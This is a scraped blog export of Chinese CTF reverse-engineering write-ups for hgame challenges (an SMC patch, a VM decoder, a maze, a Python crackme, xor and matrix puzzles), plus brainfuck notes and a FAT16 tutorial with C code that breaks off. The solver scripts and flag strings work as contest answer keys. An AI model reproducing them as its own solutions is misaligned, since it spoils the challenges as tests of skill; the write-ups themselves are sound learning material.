---------------------------------------------------------------------------.text:004018E0.text:004018E0 loc_4018E0: ; CODE XREF: sub_4017AA+126↑j.text:004018E0 E8 A7 FE FF FF call sub_40178C.text:004018E5 ; ---------------------------------------------------------------------------.text:004018E5.text:004018E5 loc_4018E5:.text:004018E5 8D 85 40 FF FF FF lea eax, [ebp-0C0h].text:004018EB 89 44 24 04 mov [esp+414h+var_410], eax ; char *.text:004018EF 8D 45 A4 lea eax, [ebp+Buf].text:004018F2 89 04 24 mov [esp+414h+var_414], eax ; char *.text:004018F5.text:004018F5 loc_4018F5: ; CODE XREF: sub_4017AA+134↑j.text:004018F5 E8 00 FC FF FF call sub_4014FA 0x 004018DE jmp 15 的意义是，除开jmp 15，往后数0x15个字节，将程序运行指针设置到此处。 而sub_4014FA是一个需要两个参数的函数，没有参数的传入，函数一定不会有正确答案。 所以我们应当将 jmp 15改为jmp到传入参数的位置 经过计算jmp 5 即可，现在我们的工作是要把0x004018DF处的15修改为5 0x15 = ‭00010101‬ 0x5 = 00000101 也就是把第五位的1抹掉就行了，之前那个不明意义的内存修改就是这个用处了。 num = (0x8df&lt;&lt;3) + 0x4 = 18172 后面是一个base64加密，但闲鱼本人并不是密码学选手，太菜了，所以暂时跳过。。 最后将改版的base64加密后的字符串与程序内的进行比较，得到flag","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"hgame_20190122","slug":"write-up/hgame-20190122","permalink":"https://mrh1s.top/categories/write-up/hgame-20190122/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"RE_Dynamic","slug":"RE-Dynamic","permalink":"https://mrh1s.top/tags/RE-Dynamic/"},{"name":"SMC","slug":"SMC","permalink":"https://mrh1s.top/tags/SMC/"}]},{"title":"HappyVM","slug":"happyvm","date":"2019-03-21T14:25:17.000Z","updated":"2019-05-07T15:57:54.014Z","comments":true,"path":"posts/461ecec/","link":"","permalink":"https://mrh1s.top/posts/461ecec/","excerpt":"","text":"happyVM 第一次做VM题，花了很多时间，最终还是有所收获 首先逆向虚拟机的操作数，操作数无非几个操作：压栈，出栈，寄存器与内存之间的读写，寄存器与寄存器之间的赋值 使用如下代码配合ida python获得所有操作数： addr = 0x400D40cnt = 0x78-0x40+1i = addrprint \"********my calc********\"print \"********my calc********\"print \"********my calc********\"print \"********my calc********\"print \"********my calc********\"while(i &lt;= addr + cnt -1): c = int(Byte(i)) if(c in [0x0,0x8,0x9,0xA,0xC,0xD,0xE,0x11,0x13,0x14]): i += 1 print \"opt:\" , hex(c) , \" data:\", hex(Byte(i)) else: print \"opt:\" , hex(c) i += 1 得到如下指令： 0(0x00) : opt: 0x11 data: 0x2d2(0x01) : opt: 0x0 data: 0x224 : opt: 0x55 : opt: 0x106 : opt: 0x14 data: 0x98 : opt: 0x179(0x9) : opt: 0x0 data: 0x3211 : opt: 0x512 : opt: 0x313 : opt: 0x11 data: 0x1615 : opt: 0x616 : opt: 0x0 data: 0x1618 : opt: 0x519 : opt: 0x11 data: 0x1621 : opt: 0x1722(0x16) : opt: 0xe data: 0x124 : opt: 0x1525 : opt: 0x426 : opt: 0xf27 : opt: 0x128 : opt: 0x1629 : opt: 0x230 : opt: 0x0 data: 0x032 : opt: 0x433 : opt: 0x334 : opt: 0x535 : opt: 0x1036 : opt: 0x14 data: 0x2b38 : opt: 0x539 : opt: 0x9 data: 0x341 : opt: 0x13 data: 0x1643(0x2b) : opt: 0x544 : opt: 0x1245(0x2d) : opt: 0x1546 : opt: 0x447 : opt: 0x1048 : opt: 0x14 data: 0x3650 : opt: 0xa data: 0x152 : opt: 0x13 data: 0x2d54(0x36) : opt: 0x355 : opt: 0x456 : opt: 0x12 逐行翻译，其中部分压栈与出栈操作可以合并为内存与寄存器，寄存器与寄存器之间的数据交换，翻译得到如下代码： simplify: call 0x2d;//strlen(str) B = 0x22; if(A != B) return;//字符串长度为0x220x9: B = 0x32; push(C);//此时C = 0x22 call(0x16); C = pop(); B = 0x16; call(0x16); return; 0x16: C--;//倒序处理整个字符串 A = str[C]; A ^= B; //str[C] = str[C] ^ B ，而且B每次加3 str[C] = A; push(B); A = 0; B = C; if(A == B)&#123;//如果这个字符串已经处理完成 goto 0x2b; &#125;else&#123; B = pop(); B += 3; goto 0x16; &#125; 0x2b: B = pop();0x2d: do&#123; A = str[C]; if(A == B) break; C++; &#125;while(A != B) A = C; ret; 最后获取到s2的数据，solve str = [132 , 131 , 157 , 145 , 129 , 151 , 215 , 190 , 67 , 114 , 97 , 115 , 115 , 12 , 106 , 112 , 115 , 17 , 72 , 44 , 52 , 51 , 49 , 54 , 35 , 52 , 62 , 92 , 35 , 78 , 23 , 17 , 25 , 89 ]B = 0x16for i in range(0x21, -1, -1): str[i] = str[i] ^ B B += 3B = 0x32for i in range(0x21, -1, -1): str[i] = str[i] ^ B B += 3for i in range(0x22): print(chr(str[i]),end=\"\")","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"hgame_20190122","slug":"write-up/hgame-20190122","permalink":"https://mrh1s.top/categories/write-up/hgame-20190122/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"},{"name":"VM","slug":"VM","permalink":"https://mrh1s.top/tags/VM/"}]},{"title":"maze","slug":"maze","date":"2019-02-16T08:22:32.000Z","updated":"2019-05-04T15:39:44.423Z","comments":true,"path":"posts/4915557e/","link":"","permalink":"https://mrh1s.top/posts/4915557e/","excerpt":"","text":"maze 迷宫题，用正确的方式走出迷宫即可，wsad分别控制上下左右 aaa = \"\"\"11111111111111111111111111111111111111111111111111111111111111111111...............111111111111111...............111 111111111111.1111111111111.111111111111111.1111111111111.111111111111111.1111111111111.111111111111111.1111111111111 .111111111111111.1111111111111.111111111111111.1111111111111.111111111111111.1111111111111s111111111111111.111111111 1111s111111111111111.11111111111111111111111111111.11111111111111111111111111111.11111111111111111111111111111.11111 111111111111111111111111.11111111111111111111111111111.1111.111111111111111111111111.1t............111111111111111.1 t............111111111111111.1111111111111.111111111111111.1111111111111.111111111111111.1111111111111.1111111111111 11.1111111111111.111111111111111.1111111111111.111111111111111.1111111111111.111111111111111.1111111111111.111111111 111111.1111111111111.111111111111111.1111111111111.111111111111111.1111111111111.111111111111111.1111111111111.11111 1111111111.1111111111111.111111111111111...............111111111111111...............1111111111111111111111111111111 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111\"\"\"cnt = 0map = \"\"for c in aaa: if(c != '\\n' and c != ' '): map = map + c cnt += 1 if(cnt % 60 == 0): map = map + '\\n'print(map) 得到如下地图： 111111111111111111111111111111111111111111111111111111111111 11111111...............111111111111111...............1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111.1111111111111s111111111111111.1111111111111s1111111 11111111.11111111111111111111111111111.111111111111111111111 11111111.11111111111111111111111111111.111111111111111111111 11111111.11111111111111111111111111111.1111.1111111111111111 11111111.1t............111111111111111.1t............1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111.1111111111111.111111111111111.1111111111111.1111111 11111111...............111111111111111...............1111111 111111111111111111111111111111111111111111111111111111111111 111111111111111111111111111111111111111111111111111111111111走出迷宫即可： wwwwaaaaaaaaaaaaaasssssssssssssssddddddddddddddwwwwwwwaaaaaaaaaaaa","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"hgame_20190122","slug":"write-up/hgame-20190122","permalink":"https://mrh1s.top/categories/write-up/hgame-20190122/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"}]},{"title":"brainfuck","slug":"brainfuck","date":"2019-02-15T16:11:14.000Z","updated":"2019-05-05T05:50:02.094Z","comments":true,"path":"posts/8616795e/","link":"","permalink":"https://mrh1s.top/posts/8616795e/","excerpt":"","text":"brainfuck是一种小型化程序语言，符合图灵完全思想 字符 含义 &gt; 指针加一 &lt; 指针减一 + 指针指向的字节的值加一 - 指针指向的字节的值减一 . 输出指针指向的单元内容（ASCⅡ码） , 输入内容到指针指向的单元（ASCⅡ码） [ 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ] 如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 ,.充当输入输出+-用于数值操作&lt;&gt;用于指针操作[]用于循环（其中执行到”[“时，程序会判断当前指针所指空间是否为0，为0则终止循环，否则继续循环） 用更通俗一点的C语言来描述： Brainfuck C &gt; ++ptr; &lt; –ptr; + ++*ptr; - –*ptr; . *ptr , *ptr =getch(); [ while (*ptr) { ] } 当前位置清零[-] 将当前指针的值归零 之前位置清零[[-]&lt;] 将当前指针以及之前的指针归零 字符I/O,. 从键盘读取一个字符并输出到屏幕上。 简单的循环,[.,] 这是一个连续从键盘读取字符并回显到屏幕上的循环。注意，这里假定0表示输入结束，事实上有些系统并非如此。以-1和”未改变”作为判断依据的程序代码分别是”,+[-.,+]”和”,[.[-],]”。 指针维护“&gt;,[.&gt;,] “通过移动指针保存所有的输入，供后面的程序使用。 加法[-&gt;+&lt;] 把当前位置的值加到后面的单元中（破坏性的加，它导致左边的单元被归零）。","categories":[{"name":"notes","slug":"notes","permalink":"https://mrh1s.top/categories/notes/"}],"tags":[]},{"title":"Pro的Python教室(二)","slug":"pro-e7-9a-84python-e6-95-99-e5-ae-a4-e4-ba-8c","date":"2019-02-15T11:05:13.000Z","updated":"2019-05-04T15:39:44.420Z","comments":true,"path":"posts/9ed4e6b7/","link":"","permalink":"https://mrh1s.top/posts/9ed4e6b7/","excerpt":"","text":"secend 很简单的一道题，python入门 使用如下网站进行反编译： https://tool.lu/pyc/ 得到 print \"Welcome to Processor's Python Classroom Part 2!\\n\"print \"Now let's start the origin of Python!\\n\"print 'Plz Input Your Flag:\\n'enc = raw_input()len = len(enc)enc1 = []enc2 = ''aaa = 'ioOavquaDb&#125;x2ha4[~ifqZaujQ#'for i in range(len): if i % 2 == 0: enc1.append(chr(ord(enc[i]) + 1)) continue enc1.append(chr(ord(enc[i]) + 2))s1 = []for x in range(3): for i in range(len): if (i + x) % 3 == 0: s1.append(enc1[i]) continueenc2 = enc2.join(s1)if enc2 in aaa: print \"You 're Right!\"else: print \"You're Wrong!\" exit(0) 解密代码： aaa = 'ioOavquaDb&#125;x2ha4[~ifqZaujQ#'list = list(aaa)len = len(aaa)dec1 = [0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]dec2 = ''cnt = 0for x in range(3): for i in range(len): if (i + x) % 3 == 0: dec1[i] = list[cnt] cnt += 1 continuefor i in range(len): if i % 2 == 0: dec2 = dec2 + chr(ord(dec1[i]) - 1) else: dec2 = dec2 + chr(ord(dec1[i]) - 2)print(dec2)","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"hgame_20190122","slug":"write-up/hgame-20190122","permalink":"https://mrh1s.top/categories/write-up/hgame-20190122/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"}]},{"title":"xor","slug":"xor","date":"2019-02-15T08:38:16.000Z","updated":"2019-05-05T05:49:45.332Z","comments":true,"path":"posts/f9cd8782/","link":"","permalink":"https://mrh1s.top/posts/f9cd8782/","excerpt":"","text":"xor 题目本身难度不大，就是异或即可，但是这个地方IDA有点问题，本来程序定义了一个数组，但是IDA里面的显示为一个变量，通过计算偏移值可以算出它是数组，这个地方以后要多加注意。 #include&lt;cstdio&gt;char a[50]=\"hgame&#123;Y0u_mayb3_need_th1s_0ne!!!!!&#125;\";int b[50]=&#123;0,0,0,0,0,0,1,0,7,0,92,18,38,11,93,43,11,23,0,23,43,69,6,86,44,54,67,0,66,85,126,72,85,30&#125;;int main()&#123; for(int i = 0; i &lt; 35; i++) printf(\"%c\", a[i] ^ b[i]); &#125;","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"hgame_20190122","slug":"write-up/hgame-20190122","permalink":"https://mrh1s.top/categories/write-up/hgame-20190122/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"}]},{"title":"wakarimasu","slug":"wakarimasu","date":"2019-02-15T08:31:00.000Z","updated":"2019-05-05T05:48:56.965Z","comments":true,"path":"posts/6aab0075/","link":"","permalink":"https://mrh1s.top/posts/6aab0075/","excerpt":"","text":"wakarimasu 本质是解两个矩阵，一个是乘法矩阵求逆，另外一个仅仅是矩阵的加减 由于矩阵求逆的时候存在小数精度问题，故用计算机算出来的值不会精确到整数，但是一旦你看到那个结果就一定会知道你算对了 算矩阵的网站：https://zh.numberempire.com/matrixcalculator.php https://zh.numberempire.com/matrixbinarycalculator.php A = 8 1 7 1 1 04 8 1 2 3 93 8 6 6 4 83 5 7 8 8 70 9 0 2 3 42 3 2 5 4 0 B = 122 207 140 149 142 16895 201 122 145 136 167112 192 127 137 134 14795 207 110 134 133 173136 212 160 162 152 179121 193 126 126 119 147 c = 16 8 8 14 6 115 23 5 10 12 2314 23 19 7 8 104 13 22 17 11 226 14 2 11 18 95 8 8 10 16 13 X1 * B = A X2 + B = C X1=AB^-1 = 5.999951 5.999888 6.000136 5.999828 5.999879 7.0000972.999953 4.999902 7.000126 5.999842 5.999886 6.0000865.999953 4.999893 4.000127 5.99984 6.99989 7.0000892.999956 6.999908 5.000125 5.999846 6.999877 5.0000896.999948 5.999879 7.000144 6.999816 4.999875 7.0001046.999956 5.999896 6.000123 2.999842 5.999887 7.000091 x2 = C - B = 8 7 1 13 5 111 15 4 8 9 1411 15 13 1 4 21 8 15 9 3 156 5 2 9 15 53 5 6 5 12 13 再将X1与X2结合（X1为高四位，X2为低四位） #include&lt;cstdio&gt;int a[]=&#123;6,6,6,6,6,7,3,5,7,6,6,6,6,5,4,6,7,7,3,7,5,6,7,5,7,6,7,7,5,7,7,6,6,3,6,7&#125;;int b[]=&#123;8,7,1,13,5,11,1,15,4,8,9,14,11,15,13,1,4,2,1,8,15,9,3,15,6,5,2,9,15,5,3,5,6,5,12,13&#125;;int main()&#123; for(int i = 0; i &lt;= 35; i++) printf(\"%c\", (a[i]&lt;&lt;4) + b[i]);&#125;","categories":[{"name":"write up","slug":"write-up","permalink":"https://mrh1s.top/categories/write-up/"},{"name":"hgame_20190122","slug":"write-up/hgame-20190122","permalink":"https://mrh1s.top/categories/write-up/hgame-20190122/"}],"tags":[{"name":"RE_Static","slug":"RE-Static","permalink":"https://mrh1s.top/tags/RE-Static/"}]},{"title":"FAT16文件系统","slug":"fat16-e6-96-87-e4-bb-b6-e7-b3-bb-e7-bb-9f","date":"2019-02-04T10:06:10.000Z","updated":"2019-05-05T05:48:21.637Z","comments":true,"path":"posts/46621246/","link":"","permalink":"https://mrh1s.top/posts/46621246/","excerpt":"","text":"参考资料：https://blog.csdn.net/sikuon/article/details/75939434 https://blog.csdn.net/cassie_huang/article/details/62227023 https://blog.csdn.net/yeruby/article/details/41978199 最详细：https://blog.csdn.net/mj5742356/article/details/20125511 长短文件名 https://wenku.baidu.com/view/d729d62a680203d8cf2f2474.html FAT16一、关于需要掌握的基础知识1.文件读写与文件指针的移动操作 2.十六进制计算 3.链表 4.小端序 二、FAT16文件系统的结构1.FAT16第一个扇区是DBR，是对整个分区的格式及参数进行说明的部分，从中可以读取到FAT所占扇区数、每簇扇区数、每个扇区的字节数、保留扇区数…… 系统通过这些参数可以计算出FAT1、FAT2、根目录、数据区的位置，其中，保留扇区之后的即为FAT区，FAT区由两个完全相同的FAT1、FAT2构成，FAT2作为FAT1的一个备份，保障数据安全。 2.FAT1中存放了每个簇之间的对应关系以及自身的属性。 FAT2是FAT1的一个备份，以便于磁盘意外损坏的恢复 通过查表我们可以了解到这个簇到底是未被使用还是已被使用，以及这个簇后面还有没有链接到下一个簇。从而将连续的数据离散储存。 3.FAT2后的是根目录，根目录占用32个扇区，当中储存了根节点下面所拥有的所有文件和文件夹（文件夹可以当作一种特殊的文件），每个文件占用32个字节（当文件名过长的时候可能会占用更多空间），这32个字节分别对应的是这个文件对应的各种属性以及簇号。 我们可以通过寻找该簇来读取该文件的具体内容，如果是文件夹，这个簇中储存的是文件夹内的所有子目录元素（与根目录的作用类似）。 文件夹创建的时候会生成两个32字节的项 一个是 “.” ，其中储存的是文件夹自身的信息 另一个是 “..”， 储存了这个文件夹的父目录的信息（方便返回上一级） 三、删除文件（夹）的过程找到描述该文件的那个32字节的项，将偏移值为0h的数据改为 E5，以说明该数据被删除。如果是文件夹的话，还应递归删除其目录下的所有文件。 四、创建文件（夹）的过程在当前目录的簇下寻找一个空位置（32字节） 将新文件（夹）的信息写入，并且在磁盘中寻找一个未使用的新簇，将其分配给创建的文件（夹） 五、读取文件（夹）的过程读取文件（夹）所对应的32字节数据，从而读取到整个文件的信息尤其是簇号，根据这个簇号去磁盘中的相应区域读取这个文件（夹）所储存的信息（文件） 六、写入文件的过程类似于读取文件 七、遇到当前簇满的处理措施在磁盘中寻找一个新簇，将原来的簇指向新簇，从而将两个簇连接在一起，形成一个连续的数据区域 八、注意事项 1.文件系统中的数据以小端序保存（数字的低位 存在 地址的低位上，这与普通人的思维有所区别） e.g. 数据1234h， 用两个字节进行存储，则其在内存中的存储形式为： 34 12 2.DBR(DOS boot record) 占一个扇区，里面储存了整个文件系统的各种配置信息（如每个扇区的字节数，每个簇的扇区数，FAT区的个数，每个FAT所占扇区数等等） 3.FAT表中每个记录的位数成为FAT大小（fat16就代表一个簇的簇号所占空间为十六位，两个字节），这意味着一个fat16磁盘最多能储存20000h个簇，也就限制了fat16的一个分区的大小 八、相关图表FAT16记录表（可先记录一下自己磁盘的如下信息，方便之后的分析，以下只是我自己SD卡的信息）对于FAT16的一个分区： 每簇占多少个扇区：64 DBR（保留扇区数）0h FAT1（FAT扇区数）：标记某个簇的状态（已使用 未使用 坏簇），以两个字节为一个单位。 1000h FAT2（FAT扇区数）：与FAT1完全一样，作为FAT1的备份 1D800h 根目录（32个扇区） ~ 3C000h 数据区（第二个簇） 40000h 第五个簇58000h 第六个簇60000h DBR数据对照表 注意：1Ch: 20为文件 10为文件夹 文件信息对照表 系统时间与文件系统中的时间的换算1.0x160x17中的时间=小时2048+分钟32+秒/2。得出的结果换算成16进制填入即可。也就是：0x16字节的04位是以2秒为单位的量值；0x16字节的57位和0x17字节的02位是分钟；0x17字节的3~7位是小时。 2.0x180x19中的日期=(年份-1980)512+月份32+日。得出的结果换算成16进制填入即可。也就是：0x18字节04位是日期数；0x18字节57位和0x19字节0位是月份；0x19字节的17位为年号，原定义中0119分别代表19802099，目前高版本的Windows允许取0~127，即年号最大可以到2107年。 FAT16簇空间大小与分区空间大小的关系 表9 FAT16分区大小与对因簇大小 分区空间大小 每个簇的扇区 簇空间大小 0MB-32MB 1 512个字节 33MB-64MB 2 1k 65MB-128MB 4 2k 129MB-225MB 8 4k 256MB-511MB 16 8k 512MB-1023MB 32 16k 1024MB-2047MB 64 32k 2048MB-4095MB 128 64k 文件操作函数： fseek函数可以把位置指针调整到文件任意位置 fseek函数里需要提供一个基准位置和目标位置到基准位置间的距离，计算机根据他们计算出目标位置SEEK_SET 0 把文件头作为基准位置SEEK_CUR 1 把当前位置作为基准位置 SEEK_END 2 把文件尾作为基准位置 以下为完整代码：程序结构设计有一点毛病，本来簇在读入程序之后可以切割成若干个32字节的块，方便操作。结果我把一个簇当成字符串处理了，所以写了很多个字符串操作函数 #include&lt;stdio.h&gt;#include&lt;time.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define TRUE 1#define FALSE 0#define ISCMD(t) strcmp(a, t) == 0#define COMMAND_MAX 100#define SECTORS_PER_CLUST 1//每簇扇区数#define BYTES_PER_SECTOR 512//每扇区字节数#define SECTORS_PER_FAT 128//每FAT扇区数#define RESERVED_SECTORS 1//保留扇区数#define SECTORS_ROOT SECTORS_PER_CLUST//根目录的扇区数#define CLUST_MAX_COUNT (SECTORS_PER_FAT * BYTES_PER_SECTOR &gt;&gt; 1) //簇的总个数 #define ROOT (RESERVED_SECTORS + SECTORS_PER_FAT * 2) * BYTES_PER_SECTOR//根目录的位置#define CLUST_SECOND ROOT + SECTORS_ROOT * BYTES_PER_SECTOR//第二个簇的位置 FILE *fp;struct clu&#123;//一个簇 int status; char byte[BYTES_PER_SECTOR * SECTORS_PER_CLUST + 10]; //簇里的扇区 &#125;clust[CLUST_MAX_COUNT];struct fi&#123;//一个文件 bool dir; char name[2][20]; int time;//修改时间 int date;//修改日期 int clust;//首簇号 long long len;//文件大小 fi *next;//下一个文件 &#125;file[1 + CLUST_MAX_COUNT * SECTORS_PER_CLUST * BYTES_PER_SECTOR / 32];int FileCnt, Clust_now;//当前文件的总个数与当前的簇 fi *HEAD;//头指针 char dir[10000][6];//存放所有文件夹名字的数组int dir_now; void Manu_Print();//打印帮助菜单bool Command_Read();//读取命令 bool Data_ReadOrWrite(const int);//文件操作，读、写、关闭void Data_Initialize();//初始化数据文件void Data_Create_New();//创建新的类FAT16数据文件void Data_Read();//将数据读入内存 void Data_Save();//保存文件 void Data_DBR_Print();//创建DBRvoid Data_Add_A_File(fi *, int, int);//将clust中指定位置的字符串填充为新文件的信息 fi *Filelist_Search_File(char *, bool);//在已经读入的文件中寻找对应名称的文件 void Filelist_Update(int);//更新文件列表 void Filelist_Destroy();//文件列表清空 void Filelist_Add_File(fi *);//在文件列表中加入一个元素 void Filelist_Bubble_Sort();//用冒泡排序把文件列表按照字典序排序void Filelist_Print();//打印出所有的文件 void File_Printf_Number(long long, int);//以小端序方式打印 (对文件)long long File_Scanf_Number(int);//读取n个字节的小端序数字void File_Printf_String(char *,int);//以字符串向文件输出信息 void File_Printf_32Bytes(fi *);//向文件中输出文件/文件夹的信息void Str_Printf_Number(char *, long long, int);//以小端序方式打印 (对字符串)long long Str_Scanf_Number(char *, int);//读取n个字节的小端序数字void Str_Scanf_String(char *, int, char *);//以二进制格式读取字符串的内容 bool Str_Read_32Bytes(char *, fi *);//读取一个文件/文件夹的信息void Str_Printf_32Bytes(char *, fi *);//向字符串中输出文件/文件夹的信息void Str_Cut_Name_Into_Two(char *, char*, char*);//将一个文件名分隔为两部分 int Clust_Judge_Status(int); //判断该簇的状态 void Time_Print(int t);//输出时间void Date_Print(int t);//输出日期 int Time_Get();//获取当前时间 int Date_Get();//获取当前日期 void Dir_Change(char *, bool);//更改目录位置 void Dir_Print();//打印当前目录int Dir_Find_Empty(int);//在一个簇里面寻找空的位置 void Make_a_New_File(fi *, bool);//返回一个创建好的空文件 void Clust_Clear_File(int);//清理某个簇内的文件的所有信息 void Clust_Clear_Dir(int);//清理某个簇内的所有文件夹 int main()&#123; Data_Initialize(); Manu_Print(); bool FLAG = FALSE; char rt[6] = \"root:\"; dir_now = 0; strcpy(dir[dir_now], rt); do&#123; Dir_Print(); printf(\"&gt;\"); FLAG = Command_Read(); &#125;while(FLAG); return 0; &#125;bool Command_Read()&#123; char str[COMMAND_MAX], a[COMMAND_MAX], b[COMMAND_MAX]; gets(str); sscanf(str, \"%s%s\", a, b); if(str[0] == 0) return TRUE; Filelist_Destroy(); Filelist_Update(Clust_now); Filelist_Bubble_Sort(); if(ISCMD(\"ls\") || ISCMD(\"dir\"))&#123; printf(\"\\n\\n\"); Dir_Print(); printf(\" contains the following files or directories:\\n\"); Filelist_Print(); &#125;else if(ISCMD(\"cd\"))&#123; char temp[20]; strcpy(temp, b); fi *t = Filelist_Search_File(temp, TRUE); if(t != NULL &amp;&amp; t-&gt;dir == TRUE)&#123; Clust_now = t-&gt;clust; if(strcmp(b, \"..\") == 0)&#123; if(dir_now != 0) Dir_Change(b, FALSE);//回退 &#125; else if(strcmp(b, \".\") != 0) Dir_Change(b, TRUE); &#125;else printf(\"Invalid directory!\\n\\n\"); &#125;else if(ISCMD(\"mkdir\"))&#123; fi *t = Filelist_Search_File(b, TRUE); if(t != NULL)&#123;//如果这个文件夹已经存在，就返回错误 printf(\"Directory already exists!\\n\"); return TRUE; &#125;else if(strlen(b) &gt;= 8)&#123; printf(\"Name too long!\\n\"); return TRUE; &#125; int Clust_temp = Clust_now; int k = Dir_Find_Empty(Clust_temp); while(k == -1)&#123; if(Clust_Judge_Status(clust[Clust_temp].status) == 0) Clust_temp = clust[Clust_temp].status;//如果这个链表的其他簇还有空位 else&#123; int Clust_new = 2;//这个链表中已经不存在空位了，要找一个空簇，从第二个簇开始找 while(clust[Clust_new].status != 0) Clust_new++; clust[Clust_temp].status = Clust_new; clust[Clust_new].status = 0xFFFF; Clust_temp = Clust_new; &#125; k = Dir_Find_Empty(Clust_temp);//重新寻找空位 &#125; fi *F = (fi*) malloc(sizeof(fi));//填充基本信息 Make_a_New_File(F, TRUE); clust[Clust_temp].status = 0xFFFF; strcpy(F-&gt;name[0], b);//修改文件夹名称 Data_Add_A_File(F, Clust_temp, k);//把文件写入簇 fi *temp = (fi*) malloc(sizeof(fi));//再拿一个临时变量 Make_a_New_File(temp, TRUE); char *p = clust[F-&gt;clust].byte; strcpy(temp-&gt;name[0], \".\"); temp-&gt;clust = F-&gt;clust; // .文件夹用于存放本文件夹的信息 Str_Printf_32Bytes(p, temp); strcpy(temp-&gt;name[0], \"..\"); temp-&gt;clust = Clust_now; // ..文件夹用于存放上一个文件夹的信息 Str_Printf_32Bytes(p + 32, temp); free(F); free(temp); &#125;else if(ISCMD(\"create\"))&#123; //类似于新建文件夹，但是不用新建 .和.. fi *t = Filelist_Search_File(b, FALSE); if(t != NULL)&#123;//如果这个文件夹已经存在，就返回错误 printf(\"Directory already exists!\\n\"); return TRUE; &#125; char temp[20];//创建一个临时字符串 strcpy(temp, b); Str_Cut_Name_Into_Two(temp, a, b); if(strlen(a) &gt;= 8 || strlen(b) &gt;=3)&#123; printf(\"Name too long!\\n\"); return TRUE; &#125; int Clust_temp = Clust_now; int k = Dir_Find_Empty(Clust_temp); while(k == -1)&#123; if(Clust_Judge_Status(clust[Clust_temp].status) == 0) Clust_temp = clust[Clust_temp].status;//如果这个链表的其他簇还有空位 else&#123; int Clust_new = 2;//这个链表中已经不存在空位了，要找一个空簇，从第二个簇开始找 while(clust[Clust_new].status != 0) Clust_new++; clust[Clust_temp].status = Clust_new; clust[Clust_new].status = 0xFFFF; Clust_temp = Clust_new; &#125; k = Dir_Find_Empty(Clust_temp);//重新寻找空位 &#125; fi *F = (fi*) malloc(sizeof(fi));//填充基本信息 Make_a_New_File(F, FALSE); clust[Clust_temp].status = 0xFFFF; strcpy(F-&gt;name[0], a);//修改文件名称 strcpy(F-&gt;name[1], b);//修改文件后缀 Data_Add_A_File(F, Clust_temp, k);//把文件写入簇 &#125;else if(ISCMD(\"rmdir\"))&#123; fi *t = Filelist_Search_File(b, TRUE); if(t == NULL)&#123; printf(\"no such a directory!\\n\"); return TRUE; &#125; Clust_Clear_Dir(t-&gt;clust); char temp[20]; strcpy(temp, b); Str_Cut_Name_Into_Two(temp, a, b);//把文件名分割一下 char *st = clust[Clust_now].byte; for(int i = 0; i &lt; SECTORS_PER_CLUST * BYTES_PER_SECTOR / 32; i++)&#123;//寻找到簇中的那个文件，并且打上0xe5标记 fi *p = (fi*) malloc(sizeof(fi)); Str_Read_32Bytes(st + i * 32, p); if(strcmp(p-&gt;name[0], a) == 0 &amp;&amp; strcmp(p-&gt;name[1], b) == 0 &amp;&amp; p-&gt;dir == TRUE)&#123; *(st + i * 32) = 0xE5; break; &#125; &#125; /* 直接找到那个文件，首先递归删除该文件夹下的所有内容 然后再把本身 标记为删除 */ &#125;else if(ISCMD(\"rm\"))&#123; fi *t = Filelist_Search_File(b, FALSE); if(t == NULL)&#123; printf(\"no such a file!\\n\"); return TRUE; &#125; Clust_Clear_File(t-&gt;clust); char *st = clust[Clust_now].byte; char temp[20]; strcpy(temp, b); Str_Cut_Name_Into_Two(temp, a, b); for(int i = 0; i &lt; SECTORS_PER_CLUST * BYTES_PER_SECTOR / 32; i++)&#123; fi *p = (fi*) malloc(sizeof(fi)); Str_Read_32Bytes(st + i * 32, p); if(strcmp(p-&gt;name[0], a) == 0 &amp;&amp; strcmp(p-&gt;name[1], b) == 0 &amp;&amp; p-&gt;dir == FALSE)&#123; *(st + i * 32) = 0xE5; break; &#125; &#125; //类似于删除文件夹，但不用递归删除 &#125;else if(ISCMD(\"read\"))&#123; fi *t = Filelist_Search_File(b, FALSE); if(t == NULL)&#123; printf(\"no such a file!\\n\"); return TRUE; &#125; int nxtClust = t-&gt;clust; bool flag = 1; printf(\"\\nThis is what %s contains:\", b); printf(\"\\n----------------------------\\n\"); while(flag == 1)&#123; for(int i = 0; i &lt; SECTORS_PER_CLUST * BYTES_PER_SECTOR; i++)&#123; if(clust[nxtClust].byte[i] == 0)&#123; flag = 0; break; &#125; printf(\"%c\",clust[nxtClust].byte[i]); &#125; if(Clust_Judge_Status(clust[nxtClust].status) == 1) flag = 0; else nxtClust = clust[nxtClust].status; &#125; printf(\"\\n----------------------------\\n\\n\"); /* 根据簇号直接搜索到对应的文件并且读入 */ &#125;else if(ISCMD(\"write\"))&#123; fi *t = Filelist_Search_File(b, FALSE); if(t == NULL)&#123; printf(\"no such a file!\\n\"); return TRUE; &#125; int nxtClust = t-&gt;clust; bool flag = 1; char c; while(flag == 1)&#123; for(int i = 0; i &lt; SECTORS_PER_CLUST * BYTES_PER_SECTOR; i++)&#123; c 